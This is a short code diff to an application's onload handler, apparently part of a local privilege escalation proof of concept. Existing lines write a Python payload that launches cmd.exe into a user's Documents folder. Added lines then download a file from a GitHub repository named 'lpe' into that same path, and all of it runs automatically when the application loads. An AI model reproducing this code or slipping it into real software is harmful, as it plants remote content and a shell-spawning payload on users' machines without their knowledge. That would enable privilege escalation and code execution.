@@ -69,6 +69,13 @@ function application_onload(obj:Object, e:LoadEventInfo)
     var oExtCommon = new ExtCommon();
 	fileContents = "__import__('subprocess').call(['cmd.exe'])";
     oExtCommon.writeFile("C:\\Users\\rlack\\Documents\\test", fileContents);
+	var objVFile  = new VirtualFile();
+	objVFile.open("C:\\Users\\rlack\\Documents\\test", VirtualFile.openCreate && VirtualFile.openWrite );
+var rtn = HttpObject00.download("https://raw.githubusercontent.com/LOURC0D3/lpe/refs/heads/main/SCH3.xadl",objVFile,false);
+
+	  objVFile.close();
+
+	
 
     /**
      * 외부확장 DLL 선언부분
